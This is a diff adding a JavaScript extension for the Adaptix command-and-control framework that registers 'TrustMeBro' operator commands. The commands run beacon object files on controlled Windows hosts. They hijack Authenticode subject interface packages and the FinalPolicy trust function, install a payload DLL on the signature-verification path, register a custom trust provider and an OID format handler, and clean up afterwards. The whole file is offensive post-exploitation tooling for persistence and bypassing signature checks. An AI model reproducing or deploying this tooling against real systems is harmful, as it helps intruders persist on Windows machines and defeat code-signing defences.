@@ -1,0 +1,124 @@
+/*
+ * tmb.axscript - TrustMeBro Adaptix Framework Extension
+ *
+ * Registers all TrustMeBro BOF commands for Adaptix C2.
+ * BOFs are loaded from the _bin/ directory relative to this script.
+ */
+
+var metadata = {
+    name: "TrustMeBro",
+    description: "Authenticode signature manipulation BOFs (SIP hijack, FinalPolicy, SigStash, probe)",
+    store: true
+};
+
+var bof_dir = ax.script_dir() + "_bin/";
+
+// ---- tmb_probe ----
+let cmd_probe = ax.create_command("tmb_probe", "Query local CI enforcement state", "tmb_probe");
+cmd_probe.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let bof_path = bof_dir + "tmb_probe." + ax.arch(id) + ".o";
+    ax.execute_alias(id, cmdline, "execute bof " + bof_path, "Task: CI probe");
+});
+
+// ---- tmb_finalpolicy ----
+let cmd_fp = ax.create_command("tmb_finalpolicy", "FinalPolicy hijack (SoftpubCleanup)", "tmb_finalpolicy [--clean]");
+cmd_fp.addArgFlagBool("--clean", "clean", "Restore FinalPolicy to default");
+cmd_fp.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let action = parsed_json["clean"] ? 1 : 0;
+    let bof_params = ax.bof_pack("short", [action]);
+    let bof_path = bof_dir + "tmb_finalpolicy." + ax.arch(id) + ".o";
+    ax.execute_alias(id, cmdline, "execute bof " + bof_path + " " + bof_params, "Task: FinalPolicy");
+});
+
+// ---- tmb_sip_hijack ----
+let cmd_sip = ax.create_command("tmb_sip_hijack", "SIP persistence (VerifyIndirectData redirect)", "tmb_sip_hijack [--sip-types pe,ps1,msi] [--all-sips] [--sac] [--clean]");
+cmd_sip.addArgFlagBool("--clean", "clean", "Restore SIP keys to defaults");
+cmd_sip.addArgFlagBool("--all-sips", "all_sips", "Target all 17 standard SIPs");
+cmd_sip.addArgFlagBool("--sac", "sac", "Include Smart App Control SIP");
+cmd_sip.addArgFlagString("--sip-types", "sip_types", "Comma-separated aliases", "pe,ps1,msi");
+cmd_sip.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let action = parsed_json["clean"] ? 1 : 0;
+    let flags = 0;
+    if (parsed_json["all_sips"]) flags |= 1;
+    if (parsed_json["sac"]) flags |= 2;
+    let guids = parsed_json["sip_types"] || "pe,ps1,msi";
+    let bof_params = ax.bof_pack("short,short,cstr", [action, flags, guids]);
+    let bof_path = bof_dir + "tmb_sip_hijack." + ax.arch(id) + ".o";
+    ax.execute_alias(id, cmdline, "execute bof " + bof_path + " " + bof_params, "Task: SIP hijack");
+});
+
+// ---- tmb_wow64_hijack ----
+let cmd_wow = ax.create_command("tmb_wow64_hijack", "SIP hijack WOW6432Node only (32-bit callers)", "tmb_wow64_hijack [--sip-types pe,ps1] [--clean]");
+cmd_wow.addArgFlagBool("--clean", "clean", "Restore WOW64 SIP keys");
+cmd_wow.addArgFlagBool("--all-sips", "all_sips", "All SIPs");
+cmd_wow.addArgFlagBool("--sac", "sac", "Smart App Control");
+cmd_wow.addArgFlagString("--sip-types", "sip_types", "Aliases", "pe,ps1,msi");
+cmd_wow.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let action = parsed_json["clean"] ? 1 : 0;
+    let flags = 0;
+    if (parsed_json["all_sips"]) flags |= 1;
+    if (parsed_json["sac"]) flags |= 2;
+    let guids = parsed_json["sip_types"] || "pe,ps1,msi";
+    let bof_params = ax.bof_pack("short,short,cstr", [action, flags, guids]);
+    let bof_path = bof_dir + "tmb_wow64_hijack." + ax.arch(id) + ".o";
+    ax.execute_alias(id, cmdline, "execute bof " + bof_path + " " + bof_params, "Task: WOW64 SIP hijack");
+});
+
+// ---- tmb_custom_provider ----
+let cmd_cp = ax.create_command("tmb_custom_provider", "Custom trust provider GUID with SoftpubCleanup", "tmb_custom_provider {GUID} [--clean]");
+cmd_cp.addArgString("guid", true);
+cmd_cp.addArgFlagBool("--clean", "clean", "Remove the custom provider");
+cmd_cp.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let action = parsed_json["clean"] ? 1 : 0;
+    let guid = parsed_json["guid"] || "";
+    let bof_params = ax.bof_pack("short,cstr", [action, guid]);
+    let bof_path = bof_dir + "tmb_custom_provider." + ax.arch(id) + ".o";
+    ax.execute_alias(id, cmdline, "execute bof " + bof_path + " " + bof_params, "Task: Custom provider");
+});
+
+// ---- tmb_sip_exec ----
+let cmd_se = ax.create_command("tmb_sip_exec", "Install payload DLL on SIP execution surface", "tmb_sip_exec install --dll C:\\path --guid pe");
+cmd_se.addArgFlagString("--dll", "dll", "Path to payload DLL", "");
+cmd_se.addArgFlagString("--guid", "guid", "GUID alias", "pe");
+cmd_se.addArgFlagBool("--clean", "clean", "Remove (same as remove)");
+cmd_se.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let action = parsed_json["clean"] ? 1 : 0;
+    let dll = parsed_json["dll"] || "";
+    let guid = parsed_json["guid"] || "pe";
+    let bof_params = ax.bof_pack("short,cstr,cstr", [action, dll, guid]);
+    let bof_path = bof_dir + "tmb_sip_exec." + ax.arch(id) + ".o";
+    ax.execute_alias(id, cmdline, "execute bof " + bof_path + " " + bof_params, "Task: SIP exec");
+});
+
+// ---- tmb_clean ----
+let cmd_clean = ax.create_command("tmb_clean", "Remove all TrustMeBro persistence", "tmb_clean --all");
+cmd_clean.addArgFlagBool("--sip", "sip", "Restore SIP keys");
+cmd_clean.addArgFlagBool("--finalpolicy", "fp", "Restore FinalPolicy");
+cmd_clean.addArgFlagBool("--all", "all", "Full cleanup");
+cmd_clean.addArgFlagString("--custom-provider", "provider", "Custom provider GUID to remove", "");
+cmd_clean.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let flags = 0;
+    if (parsed_json["sip"]) flags |= 1;
+    if (parsed_json["fp"]) flags |= 2;
+    if (parsed_json["all"]) flags |= 4;
+    let guid = parsed_json["provider"] || "";
+    let bof_params = ax.bof_pack("short,cstr", [flags, guid]);
+    let bof_path = bof_dir + "tmb_clean." + ax.arch(id) + ".o";
+    ax.execute_alias(id, cmdline, "execute bof " + bof_path + " " + bof_params, "Task: Cleanup");
+});
+
+// ---- tmb_formatghost ----
+let cmd_fg = ax.create_command("tmb_formatghost", "CryptDllFormatObject OID handler (analyst-triggered)", "tmb_formatghost --oid 1.3.6.1.4.1.311.99.1 --dll C:\\path");
+cmd_fg.addArgFlagString("--oid", "oid", "OID to register", "");
+cmd_fg.addArgFlagString("--dll", "dll", "Path to handler DLL", "");
+cmd_fg.addArgFlagString("--funcname", "func", "Export name", "FormatObject");
+cmd_fg.addArgFlagBool("--clean", "clean", "Remove the handler");
+cmd_fg.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let action = parsed_json["clean"] ? 1 : 0;
+    let oid = parsed_json["oid"] || "";
+    let dll = parsed_json["dll"] || "";
+    let func = parsed_json["func"] || "FormatObject";
+    let bof_params = ax.bof_pack("short,cstr,cstr,cstr", [action, oid, dll, func]);
+    let bof_path = bof_dir + "tmb_formatghost." + ax.arch(id) + ".o";
+    ax.execute_alias(id, cmdline, "execute bof " + bof_path + " " + bof_params, "Task: FormatGhost");
+});
